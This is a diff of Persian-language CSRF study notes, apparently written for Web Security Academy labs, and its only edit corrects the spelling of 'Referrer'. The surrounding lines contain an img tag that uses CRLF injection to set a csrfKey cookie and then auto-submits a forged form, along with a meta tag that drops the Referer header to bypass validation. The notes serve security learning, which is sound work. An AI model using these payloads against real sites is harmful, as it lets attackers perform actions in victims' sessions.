@@ -21,7 +21,7 @@
 ```HTML
 <img src="https://acbd1fe91ead2563c00539b4008c0086.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=TwzBeSszkg9tjKT3u97crNV7yWLVl0iU" onerror="document.forms[0].submit()">
 ``` 
-- اگر مقدار referrer در سمت سرور چک شود و مقدار خالی reffere را هم قبول کند
+- اگر مقدار referrer در سمت سرور چک شود و مقدار خالی Referrer را هم قبول کند
   - با اضافه کردن HTML زیر به PoC (همان بخش body)، هدر Referrer را حذف می کنیم تا این بررسی بای پاس شود
 
 ```<meta name="referrer" content="no-referrer">```
